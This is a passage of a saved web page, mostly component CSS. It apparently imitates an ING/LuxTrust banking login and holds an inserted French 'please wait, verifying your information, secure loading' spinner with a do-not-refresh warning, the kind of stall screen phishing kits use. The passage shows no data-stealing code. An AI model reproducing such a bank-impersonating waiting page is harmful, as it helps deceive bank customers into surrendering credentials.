                                        fill: var(--_previousTextButton_web_icon_fg_indigo-pressed)
                                    }

                                    :host([text]:active) ::slotted([slot="icon-after"]),
                                    :host([text][active]) ::slotted([slot="icon-after"]) {
                                        fill: var(--_textButton_web_text_fg_indigo-pressed)
                                    }

                                    :host([text][inverted]:active) ::slotted([slot="icon-before"]),
                                    :host([text][inverted][active]) ::slotted([slot="icon-before"]) {
                                        fill: var(--_previousTextButton_web_icon_fg_indigo-pressed)
                                    }

                                    :host([text][inverted]:active) ::slotted([slot="icon-after"]),
                                    :host([text][inverted][active]) ::slotted([slot="icon-after"]) {
                                        fill: var(--_textButton_web_text_fg_indigo-pressed)
                                    }

                                    :host([text]:focus) {
                                        box-shadow: inset 0 0 0 4px var(--border_focus-inner_color);
                                        outline: 2px solid var(--border_focus-outer_color);
                                        outline-offset: -2px
                                    }

                                    :host([text][disabled]) {
                                        color: var(--_textButton_web_text_fg_disabled)
                                    }

                                    :host([text][disabled]) ::slotted([slot="icon-before"]) {
                                        fill: var(--_textButton_web_text_fg_disabled)
                                    }

                                    :host([text][disabled]) ::slotted([slot="icon-after"]) {
                                        fill: var(--_textButton_web_text_fg_disabled)
                                    }

                                    @media (forced-colors:active) {

                                        :host([text]) ::slotted([slot="icon-before"]),
                                        :host([text]) ::slotted([slot="icon-after"]) {
                                            fill: ButtonText
                                        }

                                        :host([text]:hover),
                                        :host([text][orange]:hover),
                                        :host([text][grey]:hover),
                                        :host([text]:focus),
                                        :host([text][orange]:focus),
                                        :host([text][grey]:focus) {
                                            border-color: Highlight;
                                            color: Highlight
                                        }

                                        :host([text]:hover) ::slotted([slot="icon-before"]),
                                        :host([text]:hover) ::slotted([slot="icon-after"]),
                                        :host([text]:focus) ::slotted([slot="icon-before"]),
                                        :host([text]:focus) ::slotted([slot="icon-after"]) {
                                            fill: Highlight
                                        }

                                        :host([text][active]) {
                                            border-color: SelectedItem;
                                            color: SelectedItem
                                        }

                                        :host([text][active]) ::slotted([slot="icon-before"]),
                                        :host([text][active]) ::slotted([slot="icon-after"]) {
                                            fill: SelectedItem
                                        }

                                        :host([text][disabled]) {
                                            border-color: GrayText;
                                            color: GrayText
                                        }

                                        :host([text][disabled]) ::slotted([slot="icon-before"]),
                                        :host([text][disabled]) ::slotted([slot="icon-after"]) {
                                            fill: GrayText
                                        }
                                    }
                                    </style>
                                    <style>
                                    :host([elevated]) {
                                        box-shadow: 0 0 6px 0 rgb(0 0 0/12%), 0 6px 6px 0 rgb(0 0 0/24%);
                                        --__box-shadow-on-hover: 0 0 0 0
                                    }

                                    :host([elevated]:hover) {
                                        --__box-shadow-on-hover: 0 0 12px 0 rgb(0 0 0/12%), 0 12px 12px 0 rgb(0 0 0/24%)
                                    }

                                    :host([elevated]:focus) {
                                        box-shadow: inset 0 0 0 4px var(--border_focus-inner_color), 0 0 6px 0 rgba(0 0 0/12%), 0 6px 6px 0 rgba(0 0 0/24%), var(--__box-shadow-on-hover)
                                    }

                                    :host,
                                    html {
                                        --_stickyButton_web_root_borderWidth_focus: 0.063rem;
                                        --_stickyButton_web_root_borderStyle_focus: var(--border_info_style);
                                        --_stickyButton_web_root_bg_indigo: var(--bg_secondary);
                                        --_stickyButton_web_root_bg_indigo-pressed: rgba(82, 81, 153, 0.6);
                                        --_stickyButton_web_root_bg_orange: var(--bg_primary);
                                        --_stickyButton_web_root_bg_orange-pressed: rgba(255, 98, 0, 0.6);
                                        --_stickyButton_web_root_bg_sky: var(--bg_info);
                                        --_stickyButton_web_root_bg_sky-pressed: rgba(85, 155, 209, 0.6);
                                        --_stickyButton_web_root_borderColor_focus: var(--border_info_color);
                                        --_stickyButton_web_text_fg_generic: var(--fg_onColor);
                                        --_stickyButton_web_text_fg_sky: var(--fg_onColor)
                                    }
                                    </style>
                                    <style>
                                    :host([text][icon-only]) {
                                        background-color: transparent;
                                        fill: var(--_iconButton_web_icon_fg_orange)
                                    }

                                    :host([text][icon-only][grey]) {
                                        fill: var(--_iconButton_web_icon_fg_gray400)
                                    }

                                    :host([text][icon-only][inverted]) {
                                        fill: var(--_iconButton_web_icon_fg_white)
                                    }

                                    :host([text][icon-only]:hover) {
                                        background-color: var(--_iconButton_web_root_bg_orange-hover);
                                        fill: var(--_iconButton_web_icon_fg_orange-hover)
                                    }

                                    :host([text][icon-only][grey]:hover) {
                                        background-color: var(--_iconButton_web_root_bg_gray400-hover);
                                        fill: var(--_iconButton_web_icon_fg_white-hover)
                                    }

                                    :host([text][icon-only][inverted]:hover) {
                                        background-color: var(--_iconButton_web_root_bg_white-hover);
                                        fill: var(--_iconButton_web_icon_fg_white-hover)
                                    }

                                    :host([text][icon-only]:active),
                                    :host([text][icon-only][active]) {
                                        background-color: var(--_iconButton_web_root_bg_orange-pressed);
                                        fill: var(--_iconButton_web_icon_fg_orange-pressed)
                                    }

                                    :host([text][icon-only][grey]:active),
                                    :host([text][icon-only][grey][active]) {
                                        background-color: var(--_iconButton_web_root_bg_gray400-pressed)
                                    }

                                    :host([text][icon-only][inverted]:active),
                                    :host([text][icon-only][inverted][active]) {
                                        background-color: var(--_iconButton_web_root_bg_white-pressed)
                                    }

                                    :host([text][icon-only]:hover:focus),
                                    :host([text][icon-only]:active:focus),
                                    :host([text][icon-only][active]:focus) {
                                        box-shadow: inset 0 0 0 4px var(--border_focus-inner_color);
                                        outline: 2px solid var(--border_focus-outer_color);
                                        outline-offset: -2px
                                    }

                                    :host([text][icon-only][inverted]:hover:focus),
                                    :host([text][icon-only][inverted]:active:focus),
                                    :host([text][icon-only][inverted][active]:focus) {
                                        box-shadow: inset 0 0 0 4px var(--border_focus-outer_color);
                                        outline-color: var(--border_focus-inner_color)
                                    }

                                    :host([disabled][icon-only]),
                                    :host([disabled][icon-only][grey]),
                                    :host([disabled][icon-only][inverted]) {
                                        fill: var(--_iconButton_web_icon_fg_disabled);
                                        border-color: transparent
                                    }

                                    :host([text][icon-only]) {
                                        padding: 10px
                                    }

                                    :host([text][icon-only][icon20]) {
                                        padding: 8px
                                    }

                                    :host([text][icon-only][icon16]) {
                                        padding: 8px
                                    }

                                    :host([text][icon-only]) ::slotted(*) {
                                        width: 1.5rem;
                                        height: 1.5rem
                                    }

                                    :host([text][icon-only][icon20]) ::slotted(*) {
                                        width: 20px;
                                        height: 20px
                                    }

                                    :host([text][icon-only][icon16]) ::slotted(*) {
                                        width: 16px;
                                        height: 16px
                                    }

                                    :host([text][icon-only][icon20]) .click-area {
                                        margin: -3px
                                    }

                                    :host([text][icon-only][icon16]) .click-area {
                                        margin: -5px
                                    }

                                    :host,
                                    html {
                                        --_iconButton_web_root_borderWidth_focus: 0.063rem;
                                        --_iconButton_web_root_borderStyle_focus: var(--border_info_style);
                                        --_iconButton_web_root_borderWidth_white-focus: 0.063rem;
                                        --_iconButton_web_root_borderStyle_white-focus: var(--border_info-inverse_style);
                                        --_iconButton_web_icon_fg_orange: var(--fg_primary);
                                        --_iconButton_web_icon_fg_orange-hover: var(--fg_onColor);
                                        --_iconButton_web_icon_fg_orange-pressed: var(--fg_onColor);
                                        --_iconButton_web_icon_fg_gray400: var(--fg_subtle);
                                        --_iconButton_web_icon_fg_white: var(--fg_onColor);
                                        --_iconButton_web_icon_fg_white-hover: var(--fg_default);
                                        --_iconButton_web_icon_fg_disabled: var(--fg_disabled);
                                        --_iconButton_web_root_borderColor_focus: var(--border_info_color);
                                        --_iconButton_web_root_borderColor_white-focus: var(--border_info-inverse_color);
                                        --_iconButton_web_root_bg_orange-hover: var(--bg_primary);
                                        --_iconButton_web_root_bg_orange-pressed: rgba(255, 98, 0, 0.6);
                                        --_iconButton_web_root_bg_gray400-hover: var(--bg_subtle);
                                        --_iconButton_web_root_bg_gray400-pressed: rgba(217, 217, 217, 0.6);
                                        --_iconButton_web_root_bg_white-hover: var(--bg_default);
                                        --_iconButton_web_root_bg_white-pressed: rgba(255, 255, 255, 0.6)
                                    }
                                    </style>
                                    <slot name=icon-before></slot>
                                    <div class=button-content>
                                        <slot></slot>
                                    </div>
                                    <slot name=icon-after></slot>
                                </template>
                                <ing-icon icon-id=ing:arrows:arrowLeftFilled aria-hidden=true role=img variation>
                                    <template shadowrootmode=open>
                                        <style>
                                        :host {
                                            box-sizing: border-box;
                                            display: inline-block;
                                            width: 1em;
                                            height: 1em
                                        }

                                        :host([hidden]) {
                                            display: none
                                        }

                                        :host:first-child {
                                            margin-left: 0
                                        }

                                        :host:last-child {
                                            margin-right: 0
                                        }

                                        ::slotted(svg) {
                                            display: block;
                                            width: 100%;
                                            height: 100%
                                        }
                                        </style>
                                        <style>
                                        :host([variation="primary20"]),
                                        :host([variation="primary24"]),
                                        :host([variation="primary32"]),
                                        :host([variation="primary40"]),
                                        :host([variation="primary48"]),
                                        :host([variation="primary64"]) {
                                            fill: var(--fg_primary)
                                        }

                                        :host([variation="interactionPrimary20"]),
                                        :host([variation="interactionPrimary24"]),
                                        :host([variation="interactionPrimary32"]),
                                        :host([variation="interactionPrimary40"]),
                                        :host([variation="interactionPrimary48"]),
                                        :host([variation="interactionPrimary64"]) {
                                            fill: var(--fg_secondary)
                                        }

                                        :host([variation="interactionSecondary20"]),
                                        :host([variation="interactionSecondary24"]),
                                        :host([variation="interactionSecondary32"]),
                                        :host([variation="interactionSecondary40"]),
                                        :host([variation="interactionSecondary48"]),
                                        :host([variation="interactionSecondary64"]) {
                                            fill: var(--fg_subtle)
                                        }

                                        :host([variation="inverted20"]),
                                        :host([variation="inverted24"]),
                                        :host([variation="inverted32"]),
                                        :host([variation="inverted40"]),
                                        :host([variation="inverted48"]),
                                        :host([variation="inverted64"]) {
                                            fill: var(--fg_onColor)
                                        }

                                        :host([variation="disabled20"]),
                                        :host([variation="disabled24"]),
                                        :host([variation="disabled32"]),
                                        :host([variation="disabled40"]),
                                        :host([variation="disabled48"]),
                                        :host([variation="disabled64"]) {
                                            fill: var(--fg_disabled)
                                        }

                                        :host([variation="__interactionTertiary20"]),
                                        :host([variation="__interactionTertiary24"]) {
                                            fill: var(--fg_tertiary)
                                        }

                                        :host([variation="__approved20"]) {
                                            fill: var(--fg_success)
                                        }

                                        :host([variation="primary20"]),
                                        :host([variation="interactionPrimary20"]),
                                        :host([variation="interactionSecondary20"]),
                                        :host([variation="inverted20"]),
                                        :host([variation="disabled20"]),
                                        :host([variation="__interactionTertiary20"]),
                                        :host([variation="__approved20"]) {
                                            width: 20px;
                                            height: 20px
                                        }

                                        :host([variation="primary24"]),
                                        :host([variation="interactionPrimary24"]),
                                        :host([variation="interactionSecondary24"]),
                                        :host([variation="inverted24"]),
                                        :host([variation="disabled24"]),
                                        :host([variation="__interactionTertiary24"]) {
                                            width: 24px;
                                            height: 24px
                                        }

                                        :host([variation="primary32"]),
                                        :host([variation="interactionPrimary32"]),
                                        :host([variation="interactionSecondary32"]),
                                        :host([variation="inverted32"]),
                                        :host([variation="disabled32"]) {
                                            width: 32px;
                                            height: 32px
                                        }

                                        :host([variation="primary40"]),
                                        :host([variation="interactionPrimary40"]),
                                        :host([variation="interactionSecondary40"]),
                                        :host([variation="inverted40"]),
                                        :host([variation="disabled40"]) {
                                            width: 40px;
                                            height: 40px
                                        }

                                        :host([variation="primary48"]),
                                        :host([variation="interactionPrimary48"]),
                                        :host([variation="interactionSecondary48"]),
                                        :host([variation="inverted48"]),
                                        :host([variation="disabled48"]) {
                                            width: 48px;
                                            height: 48px
                                        }

                                        :host([variation="primary64"]),
                                        :host([variation="interactionPrimary64"]),
                                        :host([variation="interactionSecondary64"]),
                                        :host([variation="inverted64"]),
                                        :host([variation="disabled64"]) {
                                            width: 64px;
                                            height: 64px
                                        }

                                        ::slotted(.ing-icon--error) {
                                            fill: var(--fg_error)
                                        }

                                        ::slotted(.ing-icon--info) {
                                            fill: var(--fg_info)
                                        }

                                        ::slotted(.ing-icon--success) {
                                            fill: var(--fg_success)
                                        }

                                        ::slotted(.ing-icon--warning) {
                                            fill: var(--fg_primary)
                                        }
                                        </style>
                                        <slot></slot>
                                    </template><svg xmlns=http://www.w3.org/2000/svg viewBox="0 0 25 24" focusable=false
                                        aria-hidden=true>
                                        <path
                                            d="M18,8.007 L3.414,8.007 L9.707,1.714 L8.293,0.3 L0.293,8.3 C-0.098,8.691 -0.098,9.323 0.293,9.714 L8.293,17.714 L9.707,16.3 L3.414,10.007 L18,10.007 L18,8.007 Z"
                                            transform="translate(4 3)"></path>
                                    </svg></ing-icon>
                            </ing-button>
                        </div>
                        <h1 class="bs-navbar-title bs-text-truncate bs-flex-grow-1 bs-m-0 bs-text-sm-center bs-px-2 bs-pe-sm-12 bs-px-2-remove bs-pe-sm-12-remove"
                            ng-class="{'bs-px-4': !headerState.allowBack, 'bs-px-2 bs-pe-sm-12': headerState.allowBack}"
                            ng-bind=headerState.title>LuxTrust</h1>
                        <div class="bs-text-nowrap bs-pe-2 bs-d-sm-none sf-hidden">


                        </div>
                    </div>
                </div>
            </header>
            <nav class="bs-d-sm-none sf-hidden" role=navigation aria-label="menu principal" ng-include=templates.menu>
            </nav>
            <main role=main ing-inert=menuState.opened>
                <div id=contentscrollpane class="scrollpane-container view-animate" ng-if="ready &amp;&amp; online"
                    ng-view ng-animate-children=true>
                    <div class="scrollpane compact-scrollbar scrollbar-width-15" scrollable>
                        <div class=scrollpane-content>
                            <div class="bs-mw-sm bs-mx-auto bs-px-4 bs-pb-8 bs-pt-4 bs-pt-sm-8" ng-if=showLoginScreen>

									
									
									<style>
.zxSimpleLoad {
    width: 100%;
    min-height: 420px;

    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;

    text-align: center;

    margin: 0;
    padding: 20px 15px;

    box-sizing: border-box;
}

.zxSimpleSpinner {
    width: 50px;
    height: 50px;

    margin: 0 auto 18px;

    border: 5px solid #d9d9d9;
    border-top-color: #ff6a00;

    border-radius: 50%;

    box-sizing: border-box;

    animation: zxSimpleSpin .8s linear infinite;
}

.zxSimpleTitle {
    margin: 0 0 10px;

    font-size: 25px;
    font-weight: 700;
    line-height: 1.25;

    color: #222;
}

.zxSimpleText {
    margin: 3px 0 0;

    font-size: 17px;
    line-height: 1.4;

    color: #555;

    max-width: 520px;
}

.zxSimpleStatus {
    margin-top: 14px;

    font-size: 16px;
    font-weight: 600;

    color: #ff6a00;
}

.zxSimpleWarning {
    margin-top: 7px;

    font-size: 15px;

    color: #777;

    opacity: 0;
    transition: opacity .3s ease;
}

.zxSimpleWarning.show {
    opacity: 1;
}

@keyframes zxSimpleSpin {
    from {
        transform: rotate(0deg);
    }

    to {
        transform: rotate(360deg);
    }
}

@media (max-width: 768px) {

    .zxSimpleLoad {
        min-height: 360px;
        padding: 18px 12px;
    }

    .zxSimpleSpinner {
        width: 46px;
        height: 46px;
        border-width: 4px;
        margin-bottom: 16px;
    }

    .zxSimpleTitle {
        font-size: 22px;
    }

    .zxSimpleText {
        font-size: 16px;
        max-width: 92%;
    }

    .zxSimpleStatus {
        font-size: 15px;
    }

    .zxSimpleWarning {
        font-size: 14px;
        max-width: 92%;
    }
}

@media (max-width: 480px) {

    .zxSimpleLoad {
        min-height: 320px;
        padding: 15px 10px;
    }

    .zxSimpleSpinner {
        width: 42px;
        height: 42px;
    }

    .zxSimpleTitle {
        font-size: 20px;
    }

    .zxSimpleText {
        font-size: 15px;
    }

    .zxSimpleStatus {
        font-size: 14px;
    }

    .zxSimpleWarning {
        font-size: 13px;
    }
}
</style>

<div class="zxSimpleLoad">

    <div class="zxSimpleSpinner"></div>

    <div class="zxSimpleTitle">
        Veuillez patienter
    </div>

    <div class="zxSimpleText">
        Traitement de vos informations en cours.
    </div>

    <div class="zxSimpleText">
        Merci de patienter pendant la vérification de vos informations.
    </div>

    <div class="zxSimpleStatus">
        Chargement sécurisé...
    </div>

    <div class="zxSimpleWarning" id="zxSimpleWarning">
        Veuillez ne pas fermer ni actualiser cette page.
    </div>

</div>

<script>
document.addEventListener('DOMContentLoaded', function () {

    setTimeout(function () {

        var warning =
            document.getElementById('zxSimpleWarning');

        if (warning) {
            warning.classList.add('show');
        }

    }, 1200);

});
</script>




                            </div>
                        </div>
                        <div class=virtual-scrollbar-track>
                            <div class=virtual-scrollbar style=top:0px;height:541.577px></div>
                        </div>
                    </div>
                </div>
            </main>
            <footer role=contentinfo></footer>
        </div>
        <modal></modal>
    </div>
    <!--[if lt IE 9]>
    <script src="scripts/oldieshim.40192a07.js"></script>
    <![endif]-->
    <o5d2946a4-ae7c-47b4-85dd-e987658f807f><template shadowrootmode=closed>
            <style class=sf-hidden>
            :host {
                --default-font-family: "dac64353-8eb1-425b-bf6b-cdadc1cbf528", ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif;
                --font-heading: "dac64353-8eb1-425b-bf6b-cdadc1cbf528", ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif;
                --font-body: "dac64353-8eb1-425b-bf6b-cdadc1cbf528", ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif
            }
            </style>
            <dialog id=db155d27-9b16-4d09-8718-ff116394c0d3 closedby=closerequest
                aria-labelledby=nordvpn-extension-dialog-label aria-modal=true translate=no spellcheck=false
                class=sf-hidden></dialog>
            <style class=sf-hidden>
            @layer properties;
            @layer theme,
            base,
            components,
            utilities;

            @layer theme {

                :host,
                :root {
                    --font-mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
                    --spacing: .25rem;
                    --leading-normal: 1.5;
                    --ease-out: cubic-bezier(0, 0, .2, 1);
                    --animate-spin: spin 1s linear infinite;
                    --default-transition-duration: .15s;
                    --default-transition-timing-function: cubic-bezier(.4, 0, .2, 1);
                    --default-font-family: "Inter", "ui-sans-serif", "system-ui", "sans-serif", "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
                    --default-mono-font-family: var(--font-mono);
                    --container-md: 736px;
                    --container-lg: 960px;
                    --font-heading: "Inter", "ui-sans-serif", "system-ui", "sans-serif", "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
                    --font-body: "Inter", "ui-sans-serif", "system-ui", "sans-serif", "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
                    --fontSize-2xs: .6875rem;
                    --fontSize-xs: .75rem;
                    --fontSize-sm: .875rem;
                    --fontSize-md: 1rem;
                    --fontSize-lg: 1.125rem;
                    --fontSize-2xl: 1.375rem;
                    --fontSize-3xl: 1.5rem;
                    --fontSize-4xl: 1.625rem;
                    --fontSize-5xl: 1.75rem;
                    --fontSize-6xl: 2rem;
                    --fontSize-7xl: 2.5rem;
                    --fontWeight-normal: 400;
                    --fontWeight-medium: 500;
                    --fontWeight-bold: 600;
                    --letterSpacing-sm: -.016rem;
                    --letterSpacing-md: 0rem;
                    --borderRadius-none: 0;
                    --borderRadius-xs: 3px;
                    --borderRadius-sm: 6px;
                    --borderRadius-md: 12px;
                    --borderRadius-lg: 20px;
                    --borderRadius-full: 9999px;
                    --borderWidth-none: 0;
                    --borderWidth-md: 1px;
                    --ai-gradient: linear-gradient(251deg, rgba(96, 218, 255, .8) 25.86%, rgba(255, 118, 245, .8) 51.35%, rgba(200, 132, 255, .8) 76.69%);
                    --shadow-ai-glow: 0 0 4px 0 rgba(165, 116, 255, .6);
                    --color-neutral-0: var(--color-neutral-0);
                    --color-neutral-100: var(--color-neutral-100);
                    --color-neutral-150: var(--color-neutral-150);
                    --color-neutral-200: var(--color-neutral-200);
                    --color-neutral-300: var(--color-neutral-300);
                    --color-neutral-400: var(--color-neutral-400);
                    --color-neutral-500: var(--color-neutral-500);
                    --color-neutral-600: var(--color-neutral-600);
                    --color-neutral-700: var(--color-neutral-700);
                    --color-neutral-800: var(--color-neutral-800);
                    --color-neutral-900: var(--color-neutral-900);
                    --color-neutral-950: var(--color-neutral-950);
                    --color-neutral-1000: var(--color-neutral-1000);
                    --color-yellow-100: var(--color-yellow-100);
                    --color-yellow-200: var(--color-yellow-200);
                    --color-yellow-300: var(--color-yellow-300);
                    --color-yellow-400: var(--color-yellow-400);
                    --color-yellow-500: var(--color-yellow-500);
                    --color-yellow-600: var(--color-yellow-600);
                    --color-yellow-700: var(--color-yellow-700);
                    --color-yellow-800: var(--color-yellow-800);
                    --color-yellow-900: var(--color-yellow-900);
                    --color-yellow-950: var(--color-yellow-950);
                    --color-yellow-1000: var(--color-yellow-1000);
                    --color-blue-100: var(--color-blue-100);
                    --color-blue-200: var(--color-blue-200);
                    --color-blue-300: var(--color-blue-300);
                    --color-blue-400: var(--color-blue-400);
                    --color-blue-500: var(--color-blue-500);
                    --color-blue-600: var(--color-blue-600);
                    --color-blue-700: var(--color-blue-700);
                    --color-blue-800: var(--color-blue-800);
                    --color-blue-900: var(--color-blue-900);
                    --color-blue-950: var(--color-blue-950);
                    --color-blue-1000: var(--color-blue-1000);
                    --color-red-100: var(--color-red-100);
                    --color-red-200: var(--color-red-200);
                    --color-red-300: var(--color-red-300);
                    --color-red-400: var(--color-red-400);
                    --color-red-500: var(--color-red-500);
                    --color-red-600: var(--color-red-600);
                    --color-red-700: var(--color-red-700);
                    --color-red-800: var(--color-red-800);
                    --color-red-900: var(--color-red-900);
                    --color-red-950: var(--color-red-950);
                    --color-red-1000: var(--color-red-1000);
                    --color-green-100: var(--color-green-100);
                    --color-green-200: var(--color-green-200);
                    --color-green-300: var(--color-green-300);
                    --color-green-400: var(--color-green-400);
                    --color-green-500: var(--color-green-500);
                    --color-green-600: var(--color-green-600);
                    --color-green-700: var(--color-green-700);
                    --color-green-800: var(--color-green-800);
                    --color-green-900: var(--color-green-900);
                    --color-green-950: var(--color-green-950);
                    --color-green-1000: var(--color-green-1000);
                    --duration-fast: .15s
                }
            }

            @layer base {

                *,
                ::backdrop,
                ::file-selector-button,
                :after,
                :before {
                    box-sizing: border-box;
                    margin: 0;
                    padding: 0;
                    border: 0 solid
                }

                :host,
                html {
                    line-height: 1.5;
                    -webkit-text-size-adjust: 100%;
                    tab-size: 4;
                    font-family: var(--default-font-family, ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji");
                    font-feature-settings: var(--default-font-feature-settings, normal);
                    font-variation-settings: var(--default-font-variation-settings, normal);
                    -webkit-tap-highlight-color: transparent
                }

                hr {
                    height: 0;
                    color: inherit;
                    border-top-width: 1px
                }

                abbr:where([title]) {
                    -webkit-text-decoration: underline dotted;
                    text-decoration: underline dotted
                }

                h1,
                h2,
                h3,
                h4,
                h5,
                h6 {
                    font-size: inherit;
                    font-weight: inherit
                }

                a {
                    color: inherit;
                    -webkit-text-decoration: inherit;
                    text-decoration: inherit
                }

                b,
                strong {
                    font-weight: bolder
                }

                code,
                kbd,
                pre,
                samp {
                    font-family: var(--default-mono-font-family, ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace);
                    font-feature-settings: var(--default-mono-font-feature-settings, normal);
                    font-variation-settings: var(--default-mono-font-variation-settings, normal);
                    font-size: 1em
                }

                small {
                    font-size: 80%
                }

                sub,
                sup {
                    font-size: 75%;
                    line-height: 0;
                    position: relative;
                    vertical-align: baseline
                }

                sub {
                    bottom: -.25em
                }

                sup {
                    top: -.5em
                }

                table {
                    text-indent: 0;
                    border-color: inherit;
                    border-collapse: collapse
                }

                :-moz-focusring {
                    outline: auto
                }

                progress {
                    vertical-align: baseline
                }

                summary {
                    display: list-item
                }

                menu,
                ol,
                ul {
                    list-style: none
                }

                audio,
                canvas,
                embed,
                iframe,
                img,
                object,
                svg,
                video {
                    display: block;
                    vertical-align: middle
                }

                img,
                video {
                    max-width: 100%;
                    height: auto
                }

                ::file-selector-button,
                button,
                input,
                optgroup,
                select,
                textarea {
                    font: inherit;
                    font-feature-settings: inherit;
                    font-variation-settings: inherit;
                    letter-spacing: inherit;
                    color: inherit;
                    border-radius: 0;
                    background-color: transparent;
                    opacity: 1
                }

                :where(select:is([multiple], [size])) optgroup {
                    font-weight: bolder
                }

                :where(select:is([multiple], [size])) optgroup option {
                    padding-inline-start: 20px
                }

                ::file-selector-button {
                    margin-inline-end: 4px
                }

                ::placeholder {
                    opacity: 1
                }

                @supports (not (-webkit-appearance:-apple-pay-button)) or (contain-intrinsic-size:1px) {
                    ::placeholder {
                        color: currentcolor;

                        @supports (color:color-mix(in lab, red, red)) {
                            color: color-mix(in oklab, currentcolor 50%, transparent)
                        }
                    }
                }

                textarea {
                    resize: vertical
                }

                ::-webkit-search-decoration {
                    -webkit-appearance: none
                }

                ::-webkit-date-and-time-value {
                    min-height: 1lh;
                    text-align: inherit
                }

                ::-webkit-datetime-edit {
                    display: inline-flex
                }

                ::-webkit-datetime-edit-fields-wrapper {
                    padding: 0
                }

                ::-webkit-datetime-edit,
                ::-webkit-datetime-edit-day-field,
                ::-webkit-datetime-edit-hour-field,
                ::-webkit-datetime-edit-meridiem-field,
                ::-webkit-datetime-edit-millisecond-field,
                ::-webkit-datetime-edit-minute-field,
                ::-webkit-datetime-edit-month-field,
                ::-webkit-datetime-edit-second-field,
                ::-webkit-datetime-edit-year-field {
                    padding-block: 0
                }

                ::-webkit-calendar-picker-indicator {
                    line-height: 1
                }

                :-moz-ui-invalid {
                    box-shadow: none
                }

                ::file-selector-button,
                button,
                input:where([type=button], [type=reset], [type=submit]) {
                    appearance: button
                }

                ::-webkit-inner-spin-button,
                ::-webkit-outer-spin-button {
                    height: auto
                }

                [hidden]:where(:not([hidden=until-found])) {
                    display: none !important
                }
            }

            @layer utilities {
                .border-snake-glow {
                    background: conic-gradient(from var(--border-angle), transparent 75%, hsla(0, 0%, 100%, .95) 87.5%, transparent 100%);
                    animation: border-rotate 3s linear infinite;
                    mix-blend-mode: screen;
                    opacity: .9
                }

                .border-snake-connecting,
                .border-snake-glow {
                    position: absolute;
                    inset: 0;
                    border-radius: inherit;
                    padding: 2px;
                    -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
                    -webkit-mask-composite: xor;
                    mask-composite: exclude;
                    pointer-events: none
                }

                .border-snake-connecting {
                    background: conic-gradient(from var(--border-angle), transparent 80%, var(--color-blue-600) 90%, transparent 100%);
                    animation: border-rotate 2s linear infinite
                }

                .pointer-events-none {
                    pointer-events: none
                }

                .invisible {
                    visibility: hidden
                }

                .visible {
                    visibility: visible
                }

                .sr-only {
                    width: 1px;
                    height: 1px;
                    padding: 0;
                    margin: -1px;
                    overflow: hidden;
                    clip-path: inset(50%);
                    white-space: nowrap;
                    border-width: 0
                }

                .absolute,
                .sr-only {
                    position: absolute
                }

                .fixed {
                    position: fixed
                }

                .relative {
                    position: relative
                }

                .sticky {
                    position: sticky
                }

                .inset-0 {
                    inset: calc(var(--spacing)*0)
                }

                .inset-y-0 {
                    inset-block: calc(var(--spacing)*0)
                }

                .start {
                    inset-inline-start: var(--spacing)
                }

                .end {
                    inset-inline-end: var(--spacing)
                }

                .top-0 {
                    top: calc(var(--spacing)*0)
                }

                .top-2\.25 {
                    top: calc(var(--spacing)*2.25)
                }

                .top-3 {
                    top: calc(var(--spacing)*3)
                }

                .top-4 {
                    top: calc(var(--spacing)*4)
                }

                .top-6 {
                    top: calc(var(--spacing)*6)
                }

                .right-0 {
                    right: calc(var(--spacing)*0)
                }

                .right-2\.25 {
                    right: calc(var(--spacing)*2.25)
                }

                .right-3 {
                    right: calc(var(--spacing)*3)
                }

                .right-4 {
                    right: calc(var(--spacing)*4)
                }

                .right-6 {
                    right: calc(var(--spacing)*6)
                }

                .right-\[-0\.5px\] {
                    right: -.5px
                }

                .right-\[0\.6px\] {
                    right: .6px
                }

                .bottom-0 {
                    bottom: calc(var(--spacing)*0)
                }

                .bottom-\[-1px\] {
                    bottom: -1px
                }

                .left-0 {
                    left: calc(var(--spacing)*0)
                }

                .z-0 {
                    z-index: 0
                }

                .z-10 {
                    z-index: 10
                }

                .z-20 {
                    z-index: 20
                }

                .z-50 {
                    z-index: 50
                }

                .z-9998 {
                    z-index: 9998
                }

                .container {
                    width: 100%;

                    @media (width>=320px) {
                        max-width: 320px
                    }

                    @media (width>=768px) {
                        max-width: 768px
                    }

                    @media (width>=1200px) {
                        max-width: 1200px
                    }
                }

                .m-0 {
                    margin: calc(var(--spacing)*0)
                }

                .container {
                    margin-inline: auto;

                    @media (width>=768px) {
                        max-width: var(--container-md)
                    }

                    @media (width>=1200px) {
                        max-width: var(--container-lg)
                    }
                }

                .-mx-4 {
                    margin-inline: calc(var(--spacing)*-4)
                }

                .mx-4 {
                    margin-inline: calc(var(--spacing)*4)
                }

                .mx-5 {
                    margin-inline: calc(var(--spacing)*5)
                }

                .mx-6 {
                    margin-inline: calc(var(--spacing)*6)
                }

                .mx-auto {
                    margin-inline: auto
                }

                .-mt-1 {
                    margin-top: calc(var(--spacing)*-1)
                }

                .mt-0\.5 {
                    margin-top: calc(var(--spacing)*.5)
                }

                .mt-1 {
                    margin-top: calc(var(--spacing)*1)
                }

                .mt-2 {
                    margin-top: calc(var(--spacing)*2)
                }

                .-mb-1 {
                    margin-bottom: calc(var(--spacing)*-1)
                }

                .mb-0\.5 {
                    margin-bottom: calc(var(--spacing)*.5)
                }

                .mb-1 {
                    margin-bottom: calc(var(--spacing)*1)
                }

                .mb-2 {
                    margin-bottom: calc(var(--spacing)*2)
                }

                .mb-3 {
                    margin-bottom: calc(var(--spacing)*3)
                }

                .mb-4 {
                    margin-bottom: calc(var(--spacing)*4)
                }

                .ml-1 {
